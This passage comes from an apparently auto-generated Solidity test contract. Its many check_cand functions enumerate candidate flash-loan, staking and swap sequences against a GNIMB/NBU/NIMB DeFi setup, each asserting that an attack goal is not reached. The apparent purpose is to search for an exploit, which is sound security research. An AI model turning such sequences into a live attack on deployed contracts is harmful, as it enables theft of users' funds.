        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4611(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4612(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4613(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4614(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4615(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4616(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4617(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4618(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4619(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4620(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4621(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4622(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4623(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4624(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4625(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4626(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4627(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4628(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4629(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4630(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4631(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4632(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4633(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4634(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4635(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4636(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4637(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4638(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4639(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4640(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4641(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4642(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4643(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4644(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4645(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4646(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4647(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4648(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4649(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4650(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4651(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4652(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4653(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4654(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4655(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
